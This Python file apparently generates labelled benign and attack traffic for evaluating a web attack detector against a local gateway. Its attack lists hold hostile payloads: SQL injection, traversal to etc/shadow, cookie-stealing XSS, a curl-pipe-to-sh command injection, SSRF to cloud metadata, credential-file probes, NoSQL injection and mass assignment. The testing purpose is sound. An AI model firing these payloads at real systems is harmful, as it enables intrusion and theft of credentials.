"""Independent validation client — the held-out traffic source.

WHY THIS EXISTS
---------------
`generate.py` produces the corpus the models are fitted on. Every pool train.py
builds — base, meta, val, test — is drawn from it, so a model can score F1 0.99
on held-out test data and still fail on traffic that merely *looks different*.
That is exactly what happened: the shipped model scores 45.8% false positives
on real requests because the generator emitted one canonical shape per endpoint
and the model learned those shapes rather than what an attack is.

There is no production traffic available to validate against, so this file is
the substitute: a second client, written from the backend's API contract rather
than from the generator, whose job is to be *plausibly different*.

THE ONE RULE
------------
**This module must never import from `generate.py`.** Not a helper, not a word
list, not a payload builder. The moment it shares code, the two sources stop
being independent and every number measured with it becomes meaningless. There
is deliberate duplication in here, and it must stay.

WHAT "DIFFERENT" MEANS HERE
---------------------------
Different should mean "another realistic client population", not "adversarially
weird" — otherwise the measurement is unfair in the opposite direction. A mobile
app, a partner batch job and an ops console genuinely differ in which optional
parameters they send, how they paginate, how long their bodies are and how fast
they go. So this client uses:

  - a disjoint identity pool (no name appears in both files)
  - `offset`/`count` style pagination as well as `page`/`limit`
  - different optional-field subsets on POST bodies
  - different pacing profiles
  - independently written attack payloads

Every request is still valid against `backend/main.py`: required Pydantic fields
are always present, so a 422 means a genuine bug here rather than a rejected
attack.

USAGE
-----
    python traffic_simulator/validate_client.py --out eval_corpus.json
    python traffic_simulator/validate_client.py --send --sessions 60

`--send` drives a live gateway. Without it the corpus is only written to disk,
which is what the unit tests use.
"""
import argparse
import json
import os
import random
import string
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

GATEWAY = os.getenv("GATEWAY_URL", "http://127.0.0.1:5000")

# Disjoint from generate.py's FIRST/LAST pools, on purpose. If a name appears in
# both files the identity distributions overlap and the sources stop being
# independent.
HANDLES = [
    "amara", "bjorn", "chidi", "dilnoza", "eitan", "fatima", "gustavo",
    "hyeon", "isabela", "jarek", "kwame", "leilani", "mateus", "nadia",
    "oleksii", "pilar", "qasim", "rohini", "santiago", "thandiwe", "ulrich",
    "valentina", "wiremu", "xiulan", "yusuf", "zainab",
]
SURNAMES = ["adeyemi", "baptiste", "cheng", "dlamini", "eriksen", "fontaine",
            "gupta", "haddad", "ivanova", "jelani", "kowalczyk", "lindqvist"]
MAILHOSTS = ["mail.test", "corp.example", "inbox.invalid", "post.example"]

LOOKUPS = ["wireless mouse", "usb-c hub", "standing desk", "noise cancelling",
           "mechanical keyboard", "laptop stand", "4k monitor", "webcam",
           "o'neill", "50% off", "back-pack", "café chair", "item #42"]
SECTIONS = ["Electronics", "Accessories", "Home", "Office"]


def token(n):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(n))


def identity():
    h = random.choice(HANDLES)
    s = random.choice(SURNAMES)
    return h, s, f"{h}.{s}@{random.choice(MAILHOSTS)}"


def prose(lo, hi):
    """Comment text. Sentence-shaped rather than random words, so body entropy
    and the special-character ratio sit where human text sits."""
    bits = ["arrived on time", "packaging was fine", "works as described",
            "would order again", "colour is slightly off", "good value",
            "battery life is decent", "instructions were unclear",
            "shipping took a while", "exactly what I needed"]
    return ". ".join(random.choice(bits) for _ in range(random.randint(lo, hi))) + "."


# ── query building, written independently of generate.py's `_query` ──────────

def qs(**kw):
    """Drop None values, shuffle the ordering, encode.

    Ordering is shuffled because a client that always emits parameters in the
    same order is another way of being narrow — and `q_total_len` and
    `q_special_ratio` do not care about order, but a future feature might.
    """
    items = [(k.rstrip("_"), v) for k, v in kw.items() if v is not None]
    random.shuffle(items)
    return ("?" + urllib.parse.urlencode(items)) if items else ""


def maybe(value, p=0.5):
    """Include this parameter with probability p, else None."""
    return value if random.random() < p else None


# ── legitimate sessions ──────────────────────────────────────────────────────

def session_mobile():
    """A phone app. Small pages, offset pagination, rarely filters."""
    out = []
    out.append(("GET", "/api/products" + qs(offset=maybe(random.randint(0, 80), .6),
                                            count=maybe(random.choice([5, 10, 15]), .7)), None))
    for _ in range(random.randint(2, 7)):
        out.append(("GET", f"/api/products/{random.randint(1, 5)}", None))
    if random.random() < .5:
        out.append(("GET", "/api/search" + qs(q=random.choice(LOOKUPS),
                                              count=maybe(10, .4)), None))
    if random.random() < .35:
        h, s, email = identity()
        out.append(("POST", "/api/users/login",
                    {"username": random.choice([h, email, f"{h}{random.randint(1, 99)}"]),
                     "password": token(random.randint(8, 20))}))
    if random.random() < .3:
        body = {"text": prose(1, 3)}
        if random.random() < .6:
            body["product_id"] = random.randint(1, 5)
        if random.random() < .4:
            body["rating"] = random.randint(1, 5)
        out.append(("POST", "/api/comments", body))
    if random.random() < .25:
        out.append(("POST", "/api/orders", {"product_id": random.randint(1, 5),
                                            "quantity": random.randint(1, 3)}))
    return out, (0.25, 1.4)


def session_partner_batch():
    """A server-to-server integration. Large pages, no search, long bodies."""
    out = []
    for _ in range(random.randint(3, 9)):
        out.append(("GET", "/api/products" + qs(page=random.randint(1, 30),
                                                limit=random.choice([100, 200, 500])), None))
    out.append(("GET", "/api/orders" + qs(since=maybe("2026-01-01", .5),
                                          status=maybe("confirmed", .4)), None))
    for _ in range(random.randint(0, 4)):
        out.append(("POST", "/api/orders", {"product_id": random.randint(1, 5),
                                            "quantity": random.randint(10, 400)}))
    if random.random() < .4:
        h, s, email = identity()
        out.append(("POST", "/api/users/register",
                    {"username": f"{h}{random.randint(100, 9999)}",
                     "password": token(random.randint(12, 32)),
                     "name": f"{h.title()} {s.title()}", "email": email}))
    return out, (0.05, 0.3)


def session_ops_console():
    """An internal dashboard. Health polls, deep links, bare listings."""
    out = []
    for _ in range(random.randint(2, 6)):
        out.append(("GET", "/health", None))
    out.append(("GET", "/api/orders", None))
    out.append(("GET", "/api/products", None))
    out.append(("GET", "/api/comments" + qs(limit=maybe(50, .5)), None))
    for _ in range(random.randint(0, 3)):
        out.append(("GET", f"/api/users/{random.randint(1, 3)}", None))
    if random.random() < .3:
        out.append(("PUT", f"/api/users/{random.randint(1, 3)}",
                    {"name": f"{random.choice(HANDLES).title()} {random.choice(SURNAMES).title()}"}))
    return out, (0.4, 2.0)


def session_browser():
    """Someone shopping. Mixed pagination styles, sorting, long comments."""
    out = []
    out.append(("GET", "/api/products" + qs(page=maybe(random.randint(1, 9), .7),
                                            limit=maybe(random.choice([12, 24, 36]), .6),
                                            category=maybe(random.choice(SECTIONS), .35),
                                            order=maybe(random.choice(
                                                ["price_asc", "price_desc", "rating"]), .3)), None))
    for _ in range(random.randint(1, 6)):
        out.append(("GET", f"/api/products/{random.randint(1, 5)}", None))
    if random.random() < .7:
        out.append(("GET", "/api/search" + qs(q=random.choice(LOOKUPS),
                                              page=maybe(random.randint(1, 4), .5),
                                              category=maybe(random.choice(SECTIONS), .3)), None))
    if random.random() < .45:
        out.append(("POST", "/api/comments",
                    {"text": prose(3, 14), "product_id": random.randint(1, 5),
                     "rating": random.randint(1, 5)}))
    if random.random() < .4:
        h, s, email = identity()
        out.append(("POST", "/api/users/login",
                    {"username": random.choice([h, email, f"{h}.{s}"]),
                     "password": token(random.randint(6, 26))}))
    if random.random() < .2:
        out.append(("GET", f"/api/orders/{token(8)}", None))
    return out, (0.6, 3.0)


PROFILES = [(session_mobile, 34), (session_browser, 33),
            (session_partner_batch, 18), (session_ops_console, 15)]


# ── attacks, written independently of generate.py's payload builders ─────────
#
# Two groups, and the split is what makes the measurement useful:
#   SIGNED   — families Layer 1 has signatures for. ML adds nothing here.
#   UNSIGNED — real attacks with NO Layer 1 rule. This is the only place ML
#              enforcement can justify itself, so it must be well represented.

SIGNED_ATTACKS = [
    ("sqli", "GET", lambda: "/api/search" + qs(q="x' UNION ALL SELECT password,1 FROM users--"), None),
    ("sqli", "GET", lambda: "/api/products" + qs(id="9 OR 1=1--"), None),
    ("sqli", "POST", lambda: "/api/users/login",
     lambda: {"username": "root'/**/OR/**/'a'='a", "password": token(6)}),
    ("sqli", "GET", lambda: "/api/search" + qs(q="1);DROP TABLE orders;--"), None),
    ("sqli", "GET", lambda: "/api/products" + qs(cat="a' AND pg_sleep(9)--"), None),
    ("traversal", "GET", lambda: "/api/files/" + "%2e%2e%2f" * random.randint(3, 6) + "etc/shadow", None),
    ("traversal", "GET", lambda: "/" + "../" * random.randint(4, 8) + "proc/self/environ", None),
    ("xss", "GET", lambda: "/api/search" + qs(q="<svg/onload=alert(document.cookie)>"), None),
    ("xss", "POST", lambda: "/api/comments",
     lambda: {"text": "<iframe src=javascript:alert(1)></iframe>", "product_id": 2}),
    ("cmdi", "GET", lambda: "/api/products" + qs(export=";/bin/sh -c whoami"), None),
    ("cmdi", "POST", lambda: "/api/comments",
     lambda: {"text": "`curl http://10.1.1.9/x.sh|sh`", "product_id": 1}),
    ("ssrf", "GET", lambda: "/api/products" + qs(image="http://169.254.169.254/latest/meta-data/iam/"), None),
    ("scan", "GET", lambda: random.choice(["/.env", "/.git/HEAD", "/.aws/credentials", "/id_rsa"]), None),
    ("deser", "POST", lambda: "/api/comments",
     lambda: {"text": "rO0ABXQAEGphdmEudXRpbC5IYXNoTWFw", "product_id": 1}),
]

UNSIGNED_ATTACKS = [
    ("nosql", "POST", lambda: "/api/users/login",
     lambda: {"username": {"$regex": "^adm"}, "password": {"$ne": None}}),
    ("nosql", "POST", lambda: "/api/orders",
     lambda: {"product_id": {"$gt": 0}, "quantity": 1}),
    ("massassign", "POST", lambda: "/api/users/register",
     lambda: {"username": token(6), "password": token(10), "name": "x",
              "email": "a@b.test", "is_staff": True, "role": "owner", "credit": 999999}),
    ("massassign", "POST", lambda: "/api/orders",
     lambda: {"product_id": 1, "quantity": 1, "total_price": 0, "status": "shipped"}),
    ("idor", "GET", lambda: f"/api/users/{random.randint(10000, 99999)}", None),
    ("idor", "GET", lambda: f"/api/orders/{random.randint(10 ** 9, 10 ** 10)}", None),
    ("logic", "POST", lambda: "/api/orders",
     lambda: {"product_id": 1, "quantity": -random.randint(1000, 10 ** 7)}),
    ("logic", "POST", lambda: "/api/orders",
     lambda: {"product_id": 1, "quantity": 2 ** random.randint(31, 40)}),
    ("logic", "POST", lambda: "/api/comments",
     lambda: {"text": "A" * random.randint(60000, 200000), "product_id": 1}),
    ("enum", "GET", lambda: "/api/products" + qs(limit=10 ** random.randint(6, 9)), None),
]


def build_attack(spec):
    fam, method, path_fn, body_fn = spec
    return fam, method, path_fn(), (body_fn() if callable(body_fn) else None)


# ── corpus assembly ──────────────────────────────────────────────────────────

def build_corpus(sessions, attack_ratio):
    """Return a list of {label, family, method, path, body} dicts.

    `label` is the ground truth this whole file exists to provide. Nothing
    downstream should ever have to infer it.
    """
    corpus = []
    n_attack = int(sessions * attack_ratio)
    for _ in range(sessions - n_attack):
        fn = random.choices([p for p, _ in PROFILES],
                            weights=[w for _, w in PROFILES])[0]
        reqs, pace = fn()
        for method, path, body in reqs:
            corpus.append({"label": "normal", "family": None, "method": method,
                           "path": path, "body": body, "pace": pace})
    # An attacker probes repeatedly rather than sending one request and leaving,
    # and a handful of attack rows is too thin to estimate recall from. Each
    # attack session emits a burst, with the payload rebuilt every time so the
    # corpus does not fill up with byte-identical duplicates.
    for _ in range(n_attack):
        pool = SIGNED_ATTACKS if random.random() < 0.5 else UNSIGNED_ATTACKS
        for _ in range(random.randint(3, 8)):
            fam, method, path, body = build_attack(random.choice(pool))
            corpus.append({"label": "attack", "family": fam, "method": method,
                           "path": path, "body": body, "pace": (0.1, 0.5)})
    random.shuffle(corpus)
    return corpus


# ── sending ──────────────────────────────────────────────────────────────────

def send(method, path, body, timeout=10):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(GATEWAY + path, data=data, method=method)
    if data:
        req.add_header("content-type", "application/json")
    # A user-agent that is not in generate.py's pool, for the same independence
    # reason as the name lists. It is not a model feature, but it keeps the two
    # sources distinguishable in a raw log.
    req.add_header("user-agent", "microapi-validate/1.0")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception:
        return 0


def main():
    ap = argparse.ArgumentParser(description="Independent validation client")
    ap.add_argument("--sessions", type=int, default=80)
    ap.add_argument("--attack-ratio", type=float, default=0.25)
    ap.add_argument("--seed", type=int, default=None)
    ap.add_argument("--out", default="eval_corpus.json")
    ap.add_argument("--send", action="store_true",
                    help="drive a live gateway as well as writing the corpus")
    # Pacing must respect BOTH Layer-1 rate controls, and the sustained one is
    # the binding constraint: GUARD_RATE_LIMIT is 240 per 60 s, i.e. 4 rps, well
    # below the burst allowance of 40 per 5 s. Running at 6 rps rate-blocked 352
    # of 632 requests on the first attempt; those never reach the models, so they
    # vanish from the measurement instead of showing up as an error. 3 rps leaves
    # headroom for the whole corpus.
    ap.add_argument("--rps", type=float, default=3.0)
    args = ap.parse_args()

    if args.seed is not None:
        random.seed(args.seed)

    corpus = build_corpus(args.sessions, args.attack_ratio)
    n_norm = sum(1 for c in corpus if c["label"] == "normal")
    print(f"corpus: {len(corpus)} requests  ({n_norm} normal, "
          f"{len(corpus) - n_norm} attack) from {args.sessions} sessions")

    manifest = {"generated_by": "validate_client", "corpus": corpus,
                "started_at": None, "finished_at": None}

    def write():
        with open(args.out, "w", encoding="utf-8") as fh:
            json.dump(manifest, fh)

    if not args.send:
        write()
        print(f"wrote {args.out}")
        return 0

    # The event log is append-only and shared with every other run, so the
    # scorer needs a way to find exactly this run's rows. Without it, matching
    # on (method, template) in order silently pairs corpus rows against
    # leftovers from a previous run - which is how a set of benign requests
    # first appeared to be blocked by Layer 1 at 16.67%. Record the window.
    manifest["started_at"] = time.time() - 1.0

    gap = 1.0 / max(0.1, args.rps)
    codes = {}
    benign_422 = 0
    t0 = time.time()
    for i, c in enumerate(corpus):
        st = send(c["method"], c["path"], c["body"])
        codes[st] = codes.get(st, 0) + 1
        if st == 422 and c["label"] == "normal":
            benign_422 += 1
        time.sleep(gap)
        if (i + 1) % 100 == 0:
            print(f"  {i + 1}/{len(corpus)} sent  {time.time() - t0:.0f}s")
    manifest["finished_at"] = time.time() + 5.0   # the log writer batches
    write()
    print(f"wrote {args.out}")
    print(f"sent {len(corpus)} in {time.time() - t0:.0f}s")
    print("  status codes:", dict(sorted(codes.items())))
    # A 422 on an ATTACK row is the backend correctly rejecting a malformed
    # payload - the NoSQL injections send an object where a string is required,
    # which is the whole point of them. Only a 422 on benign traffic means this
    # client is emitting requests the API never accepts, which would make its
    # false-positive numbers meaningless.
    if benign_422:
        print(f"  WARNING: {benign_422} LEGITIMATE requests were rejected as "
              f"malformed. That is a bug in this client, not a detection - fix it "
              f"before trusting the numbers.")
    # A rate-blocked request short-circuits at Layer 1 and never reaches the
    # models, so it silently disappears from the measurement. Loud is better.
    blocked = codes.get(403, 0)
    if blocked > len(corpus) * 0.35:
        print(f"  WARNING: {blocked} of {len(corpus)} requests returned 403. If most "
              f"carry layer=L1-rate the client is going too fast for "
              f"GUARD_RATE_LIMIT and the measurement is invalid. Lower --rps.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
